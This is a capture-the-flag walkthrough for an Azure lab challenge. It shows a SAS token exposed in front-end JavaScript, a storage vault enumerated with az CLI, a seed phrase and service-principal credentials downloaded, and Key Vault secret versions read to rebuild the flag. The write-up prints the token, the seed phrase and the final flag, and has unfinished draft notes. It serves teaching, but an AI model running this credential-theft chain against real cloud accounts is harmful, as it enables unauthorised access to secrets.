<img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/0935f0f1-9a24-43ba-8099-a6c8b2cd8986" /><img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/a5feb3a4-a4f1-444c-88cb-df378dd5f204" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/ebbf52f5-5eb0-4006-83a6-41a0e290e09d" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/e165be01-8982-48c0-b1ee-86ab95ac6fb9" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/436d8986-7bed-4615-a3e7-1e54c177e12e" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/4ddc1ef8-e1b7-4ffe-8aca-19ab4bc9cf08" /><img width="784" height="505" alt="image" src="https://github.com/user-attachments/assets/fedaf903-06ee-47ee-a5b0-1676a3c87158" /># Title: CryptoCabana

#### Category: Web

#### Difficulty: Medium

#### Description: 

He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.

---

## Task 1: Azure Portal Access

Since this challenge uses Azure resources, we first need to configure our environment before interacting with the lab.

#### Install Azure CLI

Follow Microsoft's installation guide:
```https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-linux```

<img width="784" height="505" alt="image" src="https://github.com/user-attachments/assets/42abba62-76db-4296-81c2-659fdb88c9b0" />

Install Azure CLI:
```
curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
```

<img width="742" height="474" alt="image" src="https://github.com/user-attachments/assets/3da62cf8-a499-43a6-88de-705e55620ae3" />

Verify the installation:
``` az --version ```

<img width="276" height="220" alt="image" src="https://github.com/user-attachments/assets/6b40830d-16fa-4e3d-a323-1439dc4c2f94" />


Join the Lab
Click Cloud Details and Join Lab.

<img width="1692" height="409" alt="image" src="https://github.com/user-attachments/assets/bc9f5466-591d-424c-ae4b-7d7e2aecb05c" />

Open the Azure Portal:
```https://portal.azure.com/```

Once logged in:

> Open Cloud Shell
> Select Bash
> Choose No storage account required
> Select Az-Subs-CTF
> Verify access:

```az account show```

<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/48f0ad3f-9c8e-4389-9a6a-4576226d3f08" />


---

## Task 2: Hacker Holidays: Day 9

<img width="855" height="870" alt="image" src="https://github.com/user-attachments/assets/0056c0a2-94ce-4574-980e-9d96978e5859" />

<img width="871" height="765" alt="image" src="https://github.com/user-attachments/assets/006edb1a-b645-4edd-ac85-15e5beac88a7" />


#### Analysis: 

Unlike the previous web challenges, this one focuses on cloud storage misconfigurations.

The application stores users' wallet backups inside Azure Blob Storage using a Shared Access Signature (SAS) token embedded directly in the client-side JavaScript.

Although the application only intends to let users upload and access their own backups, exposing the SAS token allows anyone to enumerate accessible storage containers. This eventually leads to a backup service account, which provides access to Azure Key Vault where the flag is stored.



---

### Methodology

Access the website 

```https://cryptocabanaf5scjagc.z13.web.core.windows.net/```

<img width="1420" height="773" alt="image" src="https://github.com/user-attachments/assets/0ffad43a-25d3-4f99-9243-579f863d1b1b" />

Inspect website, put some random chars in the text field, Check network, Inspect Option Method Headers 

<img width="1716" height="538" alt="image" src="https://github.com/user-attachments/assets/fff3aeb9-e180-47d3-9588-8d662397156d" />

Analyze this: 
```
https://cryptocabanaf5scjagc.blob.core.windows.net/backups/backup-1785929856192.txt??sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
```

It is not working because of the sp=rl the sp is only set to read list 

Let's now go to app.js, to know how this website behave and we might find more clues 

<img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/7cb75957-4723-4af7-9bc0-1cbd79cb2223" />

```
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");
  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed â€” network error.";
    });
}
```

Analysis:
> 






Let's retrieve important parts of this .js file 

```
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";

const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

```

Paste the Storage_Account and Backup_sas to the azure CLI 
##Prepare the SAS for Azure CLI

```
ACCOUNT='cryptocabanaf5scjagc'
SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
```

<img width="1549" height="244" alt="image" src="https://github.com/user-attachments/assets/7a643fe0-42b5-4cd8-bf33-191db5d4eecf" />

(Explain the structure of the commands we are putting to the Azure Cli) 

Paste a command to Azure CLI to List every container in the storage 
##List every container in the storage account
```
az storage container list \
  --account-name "$ACCOUNT" \
  --sas-token "$SAS" \
  --query '[].name' \
  --output table
```

<img width="1533" height="478" alt="image" src="https://github.com/user-attachments/assets/f416ed60-1586-4126-8eb5-6fcbe3d939e9" />

That could be the cryptocabana kiosk's vault and that's what we are aiming for 


Paste a command to enumerated the contents of vault 
##enumerated the contents of vault:

```
az storage blob list \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --sas-token "$SAS" \
  --query '[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}' \
  --output table
```

<img width="1530" height="475" alt="image" src="https://github.com/user-attachments/assets/4813a53b-f865-46d4-87be-581a96727f5e" />

Here we can see the seed_phrase.txt let's download it because? what's the use of it? explain further


Paste a command to download the seed phrase 
##Download the seed phrase:

```
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'seed_phrase.txt' \
  --sas-token "$SAS" \
  --file seed_phrase.txt \
  --output none

```

<img width="801" height="178" alt="image" src="https://github.com/user-attachments/assets/105272a1-d49b-4e9b-b16f-31f9f5673d9a" />

We now successfully downloaded the seed phrase 


Paste a command to read the seed_phrase.txt
##Read it:

```
cat seed_phrase.txt
```

<img width="992" height="45" alt="image" src="https://github.com/user-attachments/assets/ad9cdd6b-d98e-4c44-b915-8f3351b4c834" />

(What does this mean? explain briefly - this is a clue to something I think?  )

``` velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp```



Paste a command tO download the servie-account file 
##Download the backup-service-account file:

```
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'backup-service-account.json' \
  --sas-token "$SAS" \
  --file backup-service-account.json \
  --output none
```

<img width="754" height="181" alt="image" src="https://github.com/user-attachments/assets/2e819dfa-db2d-4272-bd02-c94dd365f00d" />

We successfully downloaded it 


Paste a command to print the JSON 
##Pretty-print the JSON:

```
jq . backup-service-account.json
```

<img width="921" height="195" alt="image" src="https://github.com/user-attachments/assets/862eb573-f230-4193-8719-029363153a24" />

We will have a new account (explain this further) 

Create a variable for each of its content so we can easily call them 
```
CLIENT_ID=$(jq -r '.client_id' backup-service-account.json)
CLIENT_SECRET=$(jq -r '.client_secret' backup-service-account.json)
TENANT_ID=$(jq -r '.tenant_id' backup-service-account.json)
VAULT_NAME=$(jq -r '.key_vault_name' backup-service-account.json)
```



Paste a command to authenticated as the service principal 
##authenticated as the service principal:

```
az login \
  --service-principal \
  --username "$CLIENT_ID" \
  --password "$CLIENT_SECRET" \
  --tenant "$TENANT_ID" \
  --allow-no-subscriptions \
  --output none

```

<img width="1288" height="425" alt="image" src="https://github.com/user-attachments/assets/5efe5db0-1e9d-4b55-a13b-9c05f19490db" />


Verify the current Identity 
##verify the current identity:

```
az account show --query user --output json

```

<img width="581" height="121" alt="image" src="https://github.com/user-attachments/assets/bdb6bf31-9d26-49ec-824d-3015d7f2193f" />

We ae now servicePrincipal 



Paste a command to list secrets in  Azure Key vault 
##List secrets in Azure Key Vault
##We listed secret names and metadata:

```
az keyvault secret list \
  --vault-name "$VAULT_NAME" \
  --query '[].{Name:name,Enabled:attributes.enabled,Updated:attributes.updated}' \
  --output table

```
<img width="771" height="219" alt="image" src="https://github.com/user-attachments/assets/b985597c-7b3b-4afa-866f-3e9bf22deaf3" />

We can now have the Key shards 1 -3


Paste command to Retrieve individual secret values 
##retrieved the current value of each shard:


key-shard-1
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-1' \
  --query value \
  --output tsv
```

<img width="750" height="306" alt="image" src="https://github.com/user-attachments/assets/85d8bb90-6b2b-4fd1-8a63-722517ea08dc" />

We got a part of the flag

key-shard-2
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query value \
  --output tsv
```

<img width="920" height="145" alt="image" src="https://github.com/user-attachments/assets/37934a5a-5f20-4c27-81b8-2fef0e1478ab" />

The message says old value, we need to have a older version to get the shard 2

key-shard-3
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-3' \
  --query value \
  --output tsv
```
<img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/1758047f-92e1-4812-9595-ff9c9f0cf603" />

We got a part of the flag


##Recover the older version of shard 2
##Azure Key Vault secrets are versioned. When someone updates a secret, Azure normally creates a new version. The previous version is not automatically destroyed.

##list all versions of shard 2:

```
az keyvault secret list-versions \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query '[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}' \
  --output table
```
<img width="1463" height="202" alt="image" src="https://github.com/user-attachments/assets/cb978409-2df1-4e33-b31d-ab0e58b90710" />

as we notice the first one that have *5+00:00* is the first created so that's the older version we need to use


Chose earlier version 
##Choose the earlier version, take the final VERSION_ID component, and request that specific version:
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --version '3d6492d2c6f74123bc754a9ded22b2a0' \
  --query value \
  --output tsv
```

<img width="463" height="160" alt="image" src="https://github.com/user-attachments/assets/867e8868-cc21-4dcb-8001-871c6edda2d1" />

We now got the value 





---

### Today's Itinerary

1. Pull apart what the kiosk hands out for free before you've even clicked anything.

2. Follow that trust somewhere the kiosk's own page never once points you.

3. Somewhere in there is a second, more valuable set of keys - and a vault that won't give up the real values on the first ask.


---

### Flag
> THM{n0t_ur_k3ys_n0t_ur_c01ns!}

